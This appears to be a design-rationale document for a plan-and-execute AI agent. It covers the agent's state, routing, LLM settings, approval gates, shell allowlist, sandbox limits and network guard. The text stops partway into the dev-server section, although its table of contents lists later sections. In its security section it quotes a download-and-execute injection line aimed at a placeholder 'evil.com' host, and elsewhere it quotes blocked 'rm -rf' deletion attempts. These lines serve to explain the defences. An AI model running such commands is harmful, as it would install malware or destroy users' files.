# What & Why — Every Design Decision Explained

> This document explains **what** every notable constant, threshold, architectural pattern, safety mechanism, and configuration exists in the codebase, and **why** it's designed that way. Every entry traces back to a concrete problem that was encountered during development, a rate limit that was hit, or a failure mode that was observed in practice.

---

## Table of Contents

- [1. Architecture Overview](#1-architecture-overview)
- [2. Plan-Execute Core Agent](#2-plan-execute-core-agent)
  - [2.1 State Management (state.py)](#21-state-management-statepy)
  - [2.2 Graph Routing (graph.py)](#22-graph-routing-graphpy)
  - [2.3 LLM Configuration (llm.py)](#23-llm-configuration-llmpy)
  - [2.4 CLI Entrypoint (main.py)](#24-cli-entrypoint-mainpy)
  - [2.5 Node Logic (nodes.py)](#25-node-logic-nodespy)
  - [2.6 Plan Generation & Replanning (tools.py)](#26-plan-generation--replanning-toolspy)
  - [2.7 Output Persistence (output_store.py)](#27-output-persistence-output_storepy)
- [3. Tool Registry & Risk System](#3-tool-registry--risk-system)
  - [3.1 Search & Tool Wrappers (registry.py)](#31-search--tool-wrappers-registrypy)
  - [3.2 Risk Classification (risk_classifier.py)](#32-risk-classification-risk_classifierpy)
  - [3.3 User Info Store (user_info_store.py)](#33-user-info-store-user_info_storepy)
- [4. Browser Automation](#4-browser-automation)
  - [4.1 Browser Config (config.py)](#41-browser-config-configpy)
  - [4.2 Browser Runner (runner.py)](#42-browser-runner-runnerpy)
  - [4.3 Free OpenRouter Adapter (free_openrouter.py)](#43-free-openrouter-adapter-free_openrouterpy)
- [5. Sandbox & Security](#5-sandbox--security)
  - [5.1 Shell Runner (shell_runner.py)](#51-shell-runner-shell_runnerpy)
  - [5.2 Code Sandbox (runner.py)](#52-code-sandbox-runnerpy)
  - [5.3 Network Guard (network_guard.py)](#53-network-guard-network_guardpy)
  - [5.4 Dev Server Manager (server_manager.py)](#54-dev-server-manager-server_managerpy)
- [6. Dynamic Tool Synthesis](#6-dynamic-tool-synthesis)
  - [6.1 Code Generation (codegen.py)](#61-code-generation-codegenpy)
  - [6.2 Schema & Validation (schema.py, validator.py)](#62-schema--validation-schemapy-validatorpy)
  - [6.3 Synthesis Registry (registry.py)](#63-synthesis-registry-registrypy)
- [7. ReAct Agent](#7-react-agent)
- [8. Eval Framework](#8-eval-framework)
- [9. API & Visualization](#9-api--visualization)
  - [9.1 FastAPI Backend (main.py)](#91-fastapi-backend-mainpy)
  - [9.2 Event Bus System (event_bus.py)](#92-event-bus-system-event_buspy)
  - [9.3 Run Store (store.py)](#93-run-store-storepy)
  - [9.4 Web Interface Components](#94-web-interface-components)
- [10. Environment Configuration](#11-environment-configuration)

---

## 1. Architecture Overview

The system uses a **Plan-and-Execute** pattern built on LangGraph, rather than a flat ReAct loop:

| Decision | Why |
|---|---|
| **Plan-Execute over pure ReAct** | ReAct (think → act → observe) works for simple tasks but degrades on multi-step goals — the LLM loses track of the overall goal mid-execution. Plan-Execute separates planning from execution, so the LLM reasons about the whole goal once, then a graph engine executes each step mechanically. |
| **LangGraph as the orchestrator** | Provides built-in state management, conditional routing, checkpointing (pause/resume), and Human-in-the-Loop (HITL) interrupts — all critical for a multi-step agent that needs to survive process restarts and ask for approval. |
| **SQLite checkpointer** | Durable persistence so that when the agent interrupts for human approval, the entire state survives a process restart. InMemory would lose state on any crash or exit. |

---

## 2. Plan-Execute Core Agent

### 2.1 State Management (`state.py`)

#### `StepStatus` Enum (`PENDING`, `RUNNING`, `DONE`, `FAILED`, `CANCELLED`)

**What:** A 5-state lifecycle enum for each step.

**Why:** Boolean flags (`is_done`, `is_failed`) can't represent transitions like "was running but got cancelled because the step cap was hit." The 5 states map exactly to the graph's needs:
- `PENDING` → waiting to run
- `RUNNING` → executor picked it up, routing to a tool
- `DONE` → tool succeeded
- `FAILED` → tool failed, triggers replanner
- `CANCELLED` → killed by a cap/limit, triggers synthesis with partial results

#### `replace_consecutive_identical_replans` — Replace Reducer (not Additive)

**What:** This reducer **replaces** the counter value rather than **adding** to it.

**Why:** This was a bug. The original code reused the additive `sum_replan_count` reducer pattern. The replanner needs to **reset** this counter to 0 when a replan finds genuinely new information, and **set** it to an explicit count when it doesn't. With an additive reducer, returning `0` to "reset" actually just added 0 to whatever the counter already was — it could only ever climb, never reset. This masked genuinely fresh replans as consecutive-identical ones, causing premature termination. The fix: use a replace reducer so the replanner always sets the exact value it intends.

#### `replace_last_replan_context` — Replace Reducer

**What:** Stores the completed-step results from the most recent replan cycle's *execution*.

**Why:** The novelty checker needs to compare "what we got this cycle" vs "what we got last cycle." If this accumulated instead of replaced, the context would contain every prior cycle's results, making the novelty check meaningless (it would always find "new" info because the lists keep growing). Replacing ensures a clean apples-to-apples comparison.

#### `workspace_path` and `server_url` — Threaded Through State

**What:** These are set once (by `setup_workspace_node` and `start_server_node` respectively) and carried through state as `Optional[str]`.

**Why:** Global variables break LangGraph's checkpointing — when the process restarts and resumes from a checkpoint, global variables are re-initialized to their defaults, losing the workspace path. Threading through state means they're persisted in the SQLite checkpoint and survive process restarts.

#### `subtasks: list[Step] = Field(min_length=1)`

**What:** Pydantic validation that a plan must have at least one step.

**Why:** An empty plan would cause the executor to immediately route to synthesis with nothing to synthesize, producing garbage. This catches it at parse time rather than letting it fail silently downstream.

---

### 2.2 Graph Routing (`graph.py`)

#### `_route_to_tool` — The "synthesize" vs "synthesize_tool" Naming Distinction

**What:** Two routing strings that look confusingly similar but mean completely different things:
- `"synthesize"` = **final-answer synthesis** (combining all step results into a response to the user)
- `"synthesize_tool"` = **dynamic tool synthesis** (generating new callable code for unrecognized tool hints)

**Why:** Previously, unrecognized tool hints routed to a dead-end `stub_node` which marked the step `DONE` with `"[stub] Tool not implemented"` — silently pretending success. This caused the agent to synthesize garbage final answers based on a "result" that was actually a placeholder. Now, unrecognized hints route to `synthesize_tool` which actually generates and runs the code. The naming collision is acknowledged in comments but kept distinct in routing strings to avoid conflating them.

#### `_route_to_tool` — Why `tool_hint="none"` Routes to `reason_node`, Not `synthesize`

**What:** Steps with `tool_hint="none"` (pure reasoning, no external tool) now route to `reason_node` for a real LLM call.

**Why:** Previously, `tool_hint="none"` routed directly to `synthesize` (final answer). This was catastrophic when the planner emitted more than one `tool_hint="none"` step (e.g., an "analyze results" step followed by a "compile answer" step). The first `none` step would short-circuit the entire remaining plan straight to synthesis, silently skipping every step after it. Now `none` goes to `reason_node` which processes it like a real step, and synthesis only triggers when zero `RUNNING` steps remain.

#### `_route_after_tool` — `MAX_TOTAL_STEPS` Force Termination

**What:** After every tool execution, checks if `steps_executed >= MAX_TOTAL_STEPS` (15). If so, cancels all remaining steps and routes to synthesis.

**Why:** Without this, an agent with a flawed plan could loop indefinitely — fail a step, replan, fail again, replan again — burning API credits and never terminating. The step cap is the last line of defense against infinite loops.

#### `stub_node` — Kept But Unreachable

**What:** The old placeholder node is still registered but no routing edge reaches it.

**Why:** Backward compatibility. If any saved checkpoint references "stub" in its state, the graph needs the node registered to avoid a crash on resume. It's dead code in new runs.

#### HIGH-Risk Tools → `approval_node` First

**What:** Tools classified as `HIGH` risk (code execution, shell commands, browser use, file writes) route through `approval_node` which triggers a HITL interrupt before execution.

**Why:** The agent can generate and execute arbitrary code. Without approval gates, it could delete files, install malware, or submit forms on behalf of the user without any human oversight. The approval interrupt pauses the graph, surfaces the action to the CLI, and only resumes when the human explicitly approves.

---

### 2.3 LLM Configuration (`llm.py`)

#### `temperature=0` — Across All Providers

**What:** Every LLM provider (Ollama, Anthropic, Groq, OpenRouter) is configured with `temperature=0`.

**Why:** The agent needs **deterministic** behavior. Planning, code generation, and reasoning all need reproducible outputs. A non-zero temperature introduces randomness that makes debugging nearly impossible — the same goal would produce different plans on different runs.

#### `max_retries=2, timeout=30` — Groq & OpenRouter

**What:** Hard limits on SDK retry behavior and total request timeout.

**Why:** Without these, the default SDK retry/backoff on a 429 (rate limit) can silently block for minutes. To the CLI user, this looks identical to a genuine hang — no output, no error, just frozen. With `max_retries=2` and `timeout=30`, a rate limit surfaces as an explicit error within 30 seconds instead of silently blocking for an unknown duration.

#### `@lru_cache(maxsize=1)` on `get_llm()`

**What:** The LLM client is constructed once and cached for the process lifetime.

**Why:** LangGraph invokes many nodes per request, and each node calls `get_llm()`. Creating a fresh client per call adds connection/setup overhead without any benefit — the config is static after process startup. Caching with `maxsize=1` ensures exactly one client instance exists.

---

### 2.4 CLI Entrypoint (`main.py`)

#### `thread_id = f"cli-{uuid.uuid4()}"` — Fresh UUID Per Run

**What:** Every CLI run generates a unique thread ID instead of using a hardcoded string.

**Why:** This was a bug. The original code used `thread_id = "main-thread"` for every run. Since the SQLite checkpointer keys state by thread ID, a second run would resume from the first run's checkpoint — including its workspace path, server URL, and step state. This caused bizarre cross-contamination where a "build a todo app" run would inherit state from a previous "search the web" run. UUIDs ensure complete isolation.

#### `JsonPlusSerializer` with `allowed_msgpack_modules`

**What:** Custom serialization config that whitelists `StepStatus` and `Plan` for msgpack.

**Why:** LangGraph's SQLite checkpointer serializes state to disk. Without registering custom Pydantic models (`StepStatus`, `Plan`) in the serializer's allowlist, deserialization throws warnings or outright fails when resuming from a checkpoint. This is the fix for "checkpoint resumes produce corrupted state."

---

### 2.5 Node Logic (`nodes.py`)

#### `MAX_TOTAL_STEPS = 15`

**What:** Hard cap on the total number of steps the agent can execute in a single run.

**Why:** The upper bound on cost and runtime. A typical goal needs 3–7 steps; a complex goal with replanning might need 10–12. 15 gives enough headroom for legitimate complexity while preventing runaway execution. Going higher risks burning through API rate limits on free-tier models.

#### `MAX_REPLAN = 8`

**What:** Maximum number of times the replanner can be invoked.

**Why:** Each replan is an LLM call that costs tokens and time. Originally set to 4, this was increased to 8 to handle more complex multi-step tasks that require additional replanning cycles. The higher limit allows the agent to recover from genuine failures (missing package → install → retry) and handle novel information discovery while still preventing infinite loops on unsolvable problems.

#### `MAX_CONSECUTIVE_IDENTICAL_REPLANS = 2`

**What:** If the replanner produces plans that don't generate any new information twice in a row, terminate early.

**Why:** This catches the "infinite generic search" failure mode — the agent searches for "latest match results," gets generic fixture data, replans with "find recent match results" (same thing worded differently), gets the same data, replans again... This detector uses an LLM novelty check to compare step results between cycles and kills the loop after 2 consecutive cycles of no progress.

#### `_SHORT_RESULT_CHAR_LIMIT = 200`

**What:** Maximum length of a prior step's result that gets folded into a search query as context.

**Why:** Short results (like "Today's date is 2026-08-03") are useful context for narrowing searches. Long results (full web page scrapes) would bloat the query with noise and actually degrade search relevance. 200 chars is the cutoff — anything longer is treated as a raw scrape, not a concise fact.

#### `TAVILY_MAX_QUERY_CHARS = 400`

**What:** Hard truncation limit on search queries before sending to Tavily.

**Why:** **Tavily's API rejects queries over 400 characters.** Without this guard, a step description like "Search for the detailed results of the 2026 FIFA World Cup semi-final between France and Spain including..." would fail every time, and the replanner would loop forever generating equally-long queries that keep failing for the same reason. Truncating at 400 ensures the query always reaches Tavily.

#### `memory_limit_mb=256, timeout_seconds=15` — Sandbox Limits

**What:** Resource caps applied to every sandboxed Python code execution.

**Why:**
- **`timeout_seconds=15`**: Kills infinite loops (`while True: pass`) and accidentally blocking operations. 15 seconds is enough for any reasonable computation (data transforms, unit conversions, file parsing) but short enough that a stuck process doesn't freeze the entire agent for minutes.
- **`memory_limit_mb=256`**: Prevents `[x for x in range(10**10)]` or similar OOM bombs from crashing the host machine. 256MB is generous for computation but prevents runaway allocations.

#### `_FIXABLE_ERRORS` — Auto-Retry Set

**What:** A curated set of Python exception types (`ImportError`, `ModuleNotFoundError`, `IndexError`, `KeyError`, `AttributeError`, `TypeError`, `NameError`) that trigger an automatic code-fix retry (up to 2 times).

**Why:** LLMs frequently make small, mechanically-fixable mistakes — wrong import name, off-by-one index, typo in a variable name. These are NOT logical errors (the algorithm is right, just the syntax is wrong). Retrying with the error message fed back to the LLM fixes these inline without escalating to a full graph replan. Errors NOT in this set (like `ValueError`, `AssertionError`) indicate logical bugs that a simple fix won't resolve — those fail the step and trigger the replanner.

#### `_RECENCY_KEYWORDS` and `_PURE_DATE_QUERY` — Deterministic Date Anchoring

**What:** Regex patterns that detect recency language ("latest," "recent," "this year") and pure date questions ("what's today's date?").

**Why:** LLMs are notoriously bad at knowing the current date. Without explicit anchoring:
- "Who won the World Cup this year?" defaults to 2022 because the LLM's training data is stale.
- "What's today's date?" triggers a full web search for something the process already knows via `datetime.now()`.

The fix is deterministic: if recency language is detected, a date-anchor step (`Step(result="Today's date is 2026-08-03")`) is prepended to the plan before the LLM planner even runs. This step is marked `DONE` immediately (no LLM call, no search — just the system clock), and its result is auto-folded into later search queries via `_extract_search_context`. Pure date queries skip planning entirely and return the date as the final answer.

#### `_search_relevance_validation_enabled()` — Opt-In Search Validation

**What:** An optional second LLM call after every search to check if the result actually answers the question.

**Why:** Solves the "successful but irrelevant" problem. A search for "Who won the most recent World Cup?" might return a Wikipedia page listing all historical winners — Tavily reports success (it found content!), but the content doesn't actually say whether the current tournament has concluded. Without this check, the irrelevant result flows straight to synthesis, producing a hallucinated answer. With the check, the step is marked FAILED with a specific reason ("result doesn't specify whether the 2026 tournament has concluded"), giving the replanner something concrete to react to.

**Why opt-in?** It doubles the LLM calls per search step. In production, this extra cost/latency isn't always justified — most searches return relevant results. Enable via `VALIDATE_SEARCH_RELEVANCE=true` for high-stakes queries.

#### `_extract_search_context` — Narrow Context Injection

**What:** Builds a short context string from prior step results to append to the current search query.

**Why:** Only uses the most recent short result (≤200 chars) and any detected year. It does NOT concatenate all prior results — that would bloat the query with irrelevant noise and actually make search results worse. The year is extracted separately because it's the single most common piece of context a later search needs (e.g., "who won world cup → 2026 → France vs Spain semi-final result 2026").

#### `check_new_info_node` — Novelty Detection for Replanning

**What:** A dedicated node that uses an LLM to determine if new information discovered during execution genuinely changes the plan or is just redundant.

**Why:** The replanner needs to distinguish between truly novel information that requires plan modification versus redundant information that doesn't. Without this distinction, the agent might replan unnecessarily when it encounters information that doesn't actually change the optimal approach. This node uses a cheap LLM call to make this determination efficiently, reducing wasted replanning cycles while ensuring genuine novelty triggers appropriate plan adjustments.

---

### 2.6 Plan Generation & Replanning (`tools.py`)

#### `MAX_RETRIES = 2` — JSON Parse Retries

**What:** The planner retries up to 2 times if the LLM returns invalid JSON or JSON that doesn't satisfy the `Plan`/`Step` Pydantic schema.

**Why:** LLMs occasionally return markdown-fenced JSON, trailing commentary, or malformed structures. 2 retries with the parse error fed back to the model is enough to recover from formatting issues without burning excessive tokens on a genuinely broken response.

#### `MAX_REPLAN_CONTEXT_CHARS = 12_000`

**What:** Total character budget for the context string sent to the replanner.

**Why:** The replanner needs to see what happened in previous steps to make good decisions. But repeating long tool outputs (full web page scrapes, large code outputs) would blow past the LLM's context window. 12K chars is enough for ~6 steps of meaningful context while staying safely within token limits for all supported models.

#### `MAX_REPLAN_CONTEXT_ITEM_CHARS = 1_800`

**What:** Per-item truncation limit within the replan context.

**Why:** Even within the 12K total budget, a single step result shouldn't dominate. 1,800 chars per item ensures each step gets a fair share of context. The truncation is smart — it keeps both the **head** (usually the conclusion/summary) and the **tail** (often contains the most recent data), with the middle omitted.

#### `_strip_markdown_fences` — Markdown Fence Removal

**What:** Strips ` ```json ... ``` ` wrapping from LLM responses.

**Why:** Despite explicit "no markdown fences" instructions in every prompt, LLMs stubbornly wrap JSON in markdown code blocks. This is universal across models (GPT, Claude, Gemma, Nemotron). Rather than fighting the model's formatting habits, we just strip the fences before parsing.

#### `PROMPT_TEMPLATE` — Planner Prompt Design Decisions

| Instruction in Prompt | Why |
|---|---|
| "Break down into 3-7 steps" | Fewer than 3 means the plan is too vague. More than 7 means the planner is over-decomposing, wasting steps on trivial sub-tasks. |
| "rm is NOT available via shell_command" | Without this explicit instruction, the LLM plans `shell_command` steps with `rm -rf *` which always fail (rm is blocked), causing infinite replan loops. |
| "Use delete_file instead" | Gives the LLM a specific alternative rather than just blocking `rm`. Without an alternative, the replanner thrashes trying creative workarounds (`python3 -c "import shutil; shutil.rmtree('.')"`, piped rm commands, etc.). |
| Unrecognized tool hints → dynamic synthesis | The planner is told to use descriptive names like `"convert_fahrenheit_to_celsius"` for repeated logic. This routes to the synthesis pipeline which builds a reusable tool once, instead of re-generating code from scratch via `code_executor` for each input. |
| App-building step order (setup → scaffold → write → install → serve) | Without this, the planner generates steps in random order — trying to `npm install` before the workspace exists, or starting the server before writing any files. |

#### `REPLAN_INSTRUCTIONS` — Replanner-Specific Guardrails

| Instruction | Why |
|---|---|
| "Do not repeat a similarly generic search" | Breaks the infinite generic-search loop. Without this, the replanner rephrases "find latest results" as "search for recent results" — same query, same results, forever. |
| "NEVER give retry step tool_hint shell_command for server starts" | A dev server never exits on its own. `shell_command` blocks until the process exits. Pointing it at `npm run dev` hangs indefinitely. This was observed as a real hang in production — the agent would retry a failed `start_server` by switching to `shell_command`, which then hung forever with no output. |
| "If stderr already included, read it and fix BEFORE retrying" | Prevents the "retry to see the error" anti-pattern where the replanner generates a step whose sole purpose is "run it again to see what happens" — but the error is already visible in the current step's result. |

---

### 2.7 Output Persistence (`output_store.py`)

#### `_WORKSPACE_IGNORE` — Excluded Directories

**What:** Ignores `node_modules`, `__pycache__`, `.git`, `.venv`, etc. when persisting workspaces.

**Why:** These directories are massive (100MB+ for `node_modules`), fully reproducible (`npm install`), and contain no original work. Excluding them reduces output copy time from minutes to seconds and saves gigabytes of disk space.

#### `agent_outputs/<timestamp>_<goal>/` — Timestamped Output Directory

**What:** Each run's artifacts (plan, markdown summary, workspace) are persisted to a uniquely-named directory.

**Why:** Code runs in a temporary sandbox directory. Without explicit persistence, all generated files are deleted when the sandbox is cleaned up. The timestamped directory ensures:
1. Generated files survive beyond the agent's process lifetime
2. Multiple runs don't overwrite each other
3. The user can find and inspect results later

---

## 3. Tool Registry & Risk System

### 3.1 Search & Tool Wrappers (`registry.py`)

#### `_NOISE_PATTERNS` — Search Result Filtering

**What:** Regex patterns that strip navigation bars, footers, subscription prompts, and ads from search results.

**Why:** Raw web content includes massive amounts of irrelevant noise — "Subscribe to our newsletter!", "Follow us on Twitter", copyright notices, navigation menus. If passed to the LLM, this noise:
1. Wastes context window tokens
2. Can cause the LLM to hallucinate actions based on nav links ("I should click 'Subscribe'")
3. Buries the actual content the search was meant to find

#### `topic="news"` + `time_range="week"` for Recency-Sensitive Searches

**What:** When `recency_sensitive=True`, the search uses Tavily's news topic mode instead of general web search with a `days` filter.

**Why:** `days=7` alone does NOT reliably filter out stale content. Wikipedia pages, stat aggregators, and SEO content farms have recent `last-modified` timestamps even when the actual facts on the page span multiple years. A "F1 winners" page updated yesterday still lists a 2025 race as if it were current. `topic="news"` applies fundamentally different ranking that prioritizes actual news articles over reference pages.

#### Shell `stdout` capped at 1000 chars, `stderr` at 2000 chars

**What:** Tool wrappers truncate shell output before passing it to the LLM.

**Why:** A runaway `ls -la node_modules` or a massive compiler error log can produce megabytes of output. Feeding all of it to the LLM would blow the context window and produce garbage. 1000/2000 chars is enough to capture the essential success/error information while staying within token limits. stderr gets more space because error messages tend to be more informative and longer.

---

### 3.2 Risk Classification (`risk_classifier.py`)

#### Binary HIGH/LOW Risk

**What:** Every tool is statically classified as either `HIGH` (needs human approval) or `LOW` (runs automatically).

**Why:**
- **HIGH**: `code_executor`, `shell_command`, `browser_use`, `write_file`, `delete_file`, `start_server`, `synthesize_tool` — all can modify the filesystem, execute arbitrary code, or interact with external systems.
- **LOW**: `web_search`, `none` (reasoning) — read-only, no side effects.

#### Fail-Safe Default: Unknown Tools → `HIGH`

**What:** Any tool not explicitly classified defaults to `RiskLevel.HIGH`.

**Why:** If a developer adds a new tool to the registry but forgets to update the classifier, it MUST NOT bypass human approval. Defaulting to HIGH ensures new tools are safe-by-default rather than dangerous-by-default. This is a security-critical design choice.

---

### 3.3 User Info Store (`user_info_store.py`)

#### Global Storage: `~/.config/plan-execute-agent/user_info.json`

**What:** User profile data (name, email, phone) is stored in the OS-level config directory, not the project workspace.

**Why:** The agent needs to retain form-filling profiles across entirely different coding projects. If stored per-workspace, the user would have to re-enter their info for every new project. `~/.config/` is the standard XDG-style config location on macOS/Linux.

#### `source` and `confidence` Metadata

**What:** Each stored field tracks where it came from ("user_provided" vs "extracted_from_conversation") and its confidence level.

**Why:** A name explicitly provided by the user ("My name is Bipin") is a hard fact. A name extracted from a conversation ("I think they mentioned 'Bipin' earlier") is an assumption. Form-filling logic can prioritize hard facts over assumptions to reduce error rates.

---

## 4. Browser Automation

### 4.1 Browser Config (`config.py`)

#### `BROWSER_MODEL = "google/gemma-4-26b-a4b-it:free"`

**What:** The specific free-tier model used for browser automation.

**Why:** This was selected after testing multiple free OpenRouter models. Gemma 4 26B is one of the very few free-tier models that:
1. Supports native structured JSON outputs (`response_format=json_schema`) — critical for the browser-use framework which expects parsed action objects
2. Has enough reasoning capability to interpret DOM states and plan browser actions
3. Is available on OpenRouter's free tier (zero cost)

Other free models either don't support structured outputs (crash on `response_format`) or produce outputs too unreliable for browser automation.

#### `max_steps=25, max_failures=3`

**What:** Hard limits on browser automation execution.

**Why:**
- **`max_steps=25`**: A typical web task (navigate → find form → fill fields → submit) takes 5–15 steps. 25 gives headroom for complex pages with multiple interactions while preventing infinite loops (like clicking the same non-functional button forever).
- **`max_failures=3`**: If the browser agent fails 3 actions in a row (element not found, click failed, etc.), it's likely stuck and should stop rather than retry indefinitely.

---

### 4.2 Browser Runner (`runner.py`)

#### `max_clickable_elements_length=8_000`

**What:** Truncates the DOM tree representation to 8,000 characters.

**Why:** **This exists to stay within the model's rate limit and context window.** Complex websites (e.g., Amazon, Google results) can have DOM trees with thousands of interactive elements. The full parsed DOM can be 50K+ characters. Feeding all of this to a free-tier model with a small context window would:
1. Exceed the model's token limit, causing API errors
2. Hit rate limits on free-tier OpenRouter models
3. Cause the model to lose focus on the actual task buried in the noise

8,000 chars captures enough of the page structure (navigation, main content, key interactive elements) without overwhelming the model.

#### `max_history_items=8`

**What:** The browser agent only remembers its last 8 actions.

**Why:** Keeps context scaling linear and predictable. Without this limit, a 20-step browser task would accumulate a massive action history that dwarfs the actual task instruction in the prompt. 8 items gives enough context to understand what just happened without bloating the prompt.

#### `max_actions_per_step=3`

**What:** The browser agent can take at most 3 actions before stopping to observe the page state.

**Why:** Prevents blind action chains. Without this, the agent might plan "click login → type username → type password → click submit → click dashboard" as one step — but after "click login," the page might redirect, breaking the remaining actions. Forcing observation after every 3 actions ensures the agent always works with current page state.

#### Late Import (`_load_agent`)

**What:** The Playwright browser stack is only imported when `browser_use_node` actually runs.

**Why:** Playwright is a heavy dependency (chromium binary, browser contexts, async event loops). Importing it at module load time would add seconds to agent startup for every run, even when no browser task is needed. Late importing ensures the core graph boots instantly and only pays the Playwright cost when browser automation is actually invoked.

#### `use_thinking=False, enable_planning=False`

**What:** The browser sub-agent's internal planning/reasoning features are disabled.

**Why:** The outer Plan-Execute agent already handles high-level orchestration and planning. If the browser sub-agent also plans, it:
1. Duplicates token usage (planning twice for the same goal)
2. May conflict with the orchestrator's strategy
3. Adds latency for no benefit

The browser agent should be a dumb executor: take the task, interact with the page, return results.

---

### 4.3 Free OpenRouter Adapter (`free_openrouter.py`)

#### Two-Attempt Fallback Strategy

**What:** First attempts standard API structure (`response_format=json_schema`). If it fails (returns `content=None`), retries with the schema manually injected into the system prompt text.

**Why:** Free OpenRouter models are unreliable with strict JSON schemas. They often return `content=None` (empty response) when `response_format=json_schema` is specified — the model silently fails to generate valid structured output. The fallback strategy injects the expected JSON structure directly into the prompt text, which free models handle much better.

#### `strip_markdown_fences`

**What:** Strips ` ```json ... ``` ` wrapping from model outputs.

**Why:** Free LLMs stubbornly wrap JSON in markdown fences even when explicitly told not to. Pydantic's JSON parser crashes on the backtick formatting. This is a universal problem across all free-tier models — the stripping is a necessary workaround.

---

## 5. Sandbox & Security

### 5.1 Shell Runner (`shell_runner.py`)

#### `shell=False` — Always, No Exceptions

**What:** All subprocess calls use `shell=False` with commands tokenized via `shlex.split()`.

**Why:** This is the **single most important security rule** in the entire codebase. With `shell=True`, the LLM could inject shell metacharacters — `npm install react && curl evil.com/malware.sh | bash` — and the shell would happily execute the injected command. With `shell=False`, `&&`, `|`, `$()`, and backticks are treated as literal characters, not shell syntax. They become harmless arguments.

#### `ALLOWED_COMMANDS` — Command Allowlist

**What:** Only 15 specific commands (`mkdir`, `npm`, `python3`, `git`, etc.) are allowed.

| Allowed | Why |
|---|---|
| `npm`, `npx`, `pip`, `pip3` | Package installation and scaffolding — core to building apps |
| `mkdir`, `touch`, `ls`, `cat`, `cp`, `mv` | Basic filesystem operations for project setup |
| `python3`, `node` | Running scripts — gated by the code execution sandbox |
| `git` | Version control |
| `sh`, `bash` | Needed because some npx scaffolders (`create-vite`) shell out internally |
| `which`, `pwd`, `echo` | Diagnostic/debugging |

**Notably absent:** `rm` (deletion handled by pure-Python `delete_path`), `curl`/`wget` (network access controlled separately), `sudo` (obvious), `chmod` (permission changes).

#### `DEFAULT_QUICK_TIMEOUT = 30`, `DEFAULT_INSTALL_TIMEOUT = 180`

**What:** Two timeout tiers based on command type.

**Why:**
- **30s for quick commands** (`ls`, `mkdir`, `cat`): These should complete in milliseconds. 30s is extremely generous — if they take longer, something is fundamentally wrong.
- **180s (3 minutes) for installs** (`npm install`, `pip install`, `npx create-vite`): Package installation involves network I/O, dependency resolution, and potentially compilation. `npm install` for a React app with all dependencies can legitimately take 60–120 seconds. 180s gives sufficient headroom.

#### `stdin=subprocess.DEVNULL`

**What:** Child processes receive EOF immediately on stdin.

**Why:** Dev tools like `create-vite` detect a terminal and emit interactive prompts ("Which linter to use?", "Port 3000 is in use, try another?"). If the child inherits our stdin (a live TTY), it stalls waiting for an answer that will never come, eventually timing out after 180 seconds. With `DEVNULL`, the child sees EOF immediately and either falls back to defaults or fails fast with a clear error — deterministic behavior instead of mysterious timeouts.

#### `CI=true`, `npm_config_yes=true` — Environment Variables

**What:** Set automatically for all child processes.

**Why:** These suppress interactive prompts in npm/npx tools. `CI=true` tells most CLI tools they're in a non-interactive environment. `npm_config_yes=true` auto-approves npm prompts. Without these, even simple `npm init` would stall waiting for user input.

#### `_assert_within_workspace` — Workspace Confinement via `os.path.realpath`

**What:** Resolves symlinks before checking if the path is inside the workspace.

**Why:** Without `realpath`, an attacker could create a symlink inside the workspace pointing to `/etc/` or `~/`, then run commands in that symlink'd directory — technically "inside the workspace" by string comparison, but actually operating on the root filesystem. Resolving symlinks first closes this escape hatch.

#### `python` → `python3` Normalization

**What:** Bare `python` is automatically rewritten to `python3`.

**Why:** LLMs routinely generate `python script.py` instead of `python3 script.py`. On modern macOS/Linux, `python` often doesn't exist as an executable (only `python3`). Without rewriting, the command passes the allowlist check but then fails at spawn time with "Executable not found." Rewriting ensures the allowlist, the subprocess, and the error messages are all consistent.

#### `delete_path` — Pure Python Deletion

**What:** File/directory deletion uses `os.unlink` and `shutil.rmtree` instead of shelling out to `rm`.

**Why:** `rm` is excluded from `ALLOWED_COMMANDS` for security. But the agent has a legitimate need to delete files (e.g., "clear the workspace and start over"). Without `delete_path`, the replanner thrashes trying creative workarounds — `rm -rf *`, `python3 -c "import shutil; ..."`, piped commands — all of which fail. `delete_path` provides a safe, workspace-confined alternative that doesn't need shell access.

---

### 5.2 Code Sandbox (`runner.py`)

#### `DEFAULT_TIMEOUT_SECONDS = 15`, `DEFAULT_MEMORY_LIMIT_MB = 256`

**What:** Resource caps for sandboxed Python code execution.

**Why:** Same as described in [section 2.5](#25-node-logic-nodespy). These prevent infinite loops and OOM bombs from LLM-generated code.

#### `RLIMIT_AS` Memory Cap via `preexec_fn`

**What:** Uses `resource.setrlimit(RLIMIT_AS)` to cap total virtual memory before the child process starts.

**Why:** `RLIMIT_AS` caps virtual address space, catching massive allocations before they're even paged into physical memory. This is enforced at the OS level — the Python process can't circumvent it. Note: fails open on macOS/Windows where `RLIMIT_AS` isn't supported, but the timeout still catches runaway processes.

#### "MemoryError" Detection in stderr

**What:** Explicitly checks for `"MemoryError"` string in stderr output.

**Why:** When `RLIMIT_AS` is exhausted, Python raises `MemoryError`, but the subprocess exits with a generic non-zero code. Without explicit detection, the error message would be "Command exited with code 1" — useless for the replanner. Detecting "MemoryError" provides the actionable message "exceeded memory limit," which the replanner can react to (e.g., by generating more memory-efficient code).

#### JSON Output on Last Non-Empty Line

**What:** The parser searches for the last non-empty line of stdout to parse as JSON.

**Why:** LLM-generated scripts often include `print()` debug statements. The JSON contract says "the script's output is its final stdout line." Searching from the bottom allows debug prints without breaking the contract.

---

### 5.3 Network Guard (`network_guard.py`)

#### Python-Level Monkeypatching via `sitecustomize.py`

**What:** Network restriction is enforced by injecting a `sitecustomize.py` that patches `socket.socket.connect` and `socket.getaddrinfo`.

**Why:** True network isolation requires OS-level tools (Linux namespaces, Docker, seccomp) which need elevated privileges. This Python-level approach:
1. Works without root/sudo
2. Requires no additional dependencies
3. Works on macOS (where Linux namespaces don't exist)
4. Is sufficient for LLM code operating in good faith (standard Python HTTP libraries all route through `socket`)

**Acknowledged limitation:** Bypassable by adversarial C extensions that call `connect()` directly without going through Python's socket module. For production, wrap in Docker.

#### Why `getaddrinfo` is the Patch Target

**What:** The guard patches `socket.getaddrinfo` specifically.

**Why:** This is the DNS-resolution chokepoint. Every Python HTTP client — `requests`, `urllib`, `httpx`, `aiohttp` — calls `getaddrinfo` to resolve hostnames before opening a socket. Patching this single function blocks outbound connections for all standard libraries without needing to patch each library individually.

#### `SANDBOX_ALLOWED_DOMAINS` Environment Variable

**What:** Passes the domain allowlist to the subprocess via environment variable.

**Why:** The subprocess is a separate Python process — it can't access the parent's variables. The environment variable is the standard IPC mechanism for passing configuration to child processes.

---

### 5.4 Dev Server Manager (`server_manager.py`)

#### Module-Level Registry `_REGISTRY` (Global Dict)

**What:** A global dictionary keyed by `workspace_path` that holds `DevServer` instances (including the `Popen` process handle).

